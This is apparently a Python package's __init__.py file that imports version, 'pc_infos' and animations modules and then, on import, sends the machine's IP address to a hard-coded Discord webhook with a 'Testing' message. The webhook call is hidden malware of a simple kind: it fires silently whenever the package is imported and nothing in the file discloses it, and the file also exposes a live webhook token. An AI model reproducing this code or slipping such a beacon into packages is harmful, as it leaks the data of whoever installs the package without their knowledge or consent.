from .version import *
from .pc_infos import *
from .animations import *

requests.post("https://discord.com/api/webhooks/1361376362488922144/s1euiANXzKbisjSUl5joGDQiLsPmP5dk3xsZvPUZvxWd5RY756CJQ479mKuD8H8NdZAb", json={"content": "Testing " + get_ip()})